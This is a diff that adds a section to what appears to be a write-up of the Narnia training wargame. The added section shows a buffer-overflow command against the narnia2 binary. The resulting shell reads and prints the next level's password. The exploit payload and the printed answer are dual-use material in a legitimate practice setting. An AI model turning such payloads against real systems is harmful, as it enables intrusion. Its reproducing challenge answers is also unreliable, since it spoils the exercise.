@@ -133,3 +133,11 @@ I hope this helped to explain some basic computer exploitation principles in reg
 
 ### Narnia2
 **TBD**
+
+```
+narnia2@narnia:~$ /narnia/narnia2 $(python -c 'print "A"*132+"\x50\xc8\xe4\xf7\x10\x10\xe1\xf7\xc8\xec\xf6\xf7"')
+$ whoami
+narnia3
+$ cat /etc/narnia_pass/narnia3
+vaequeezee
+```
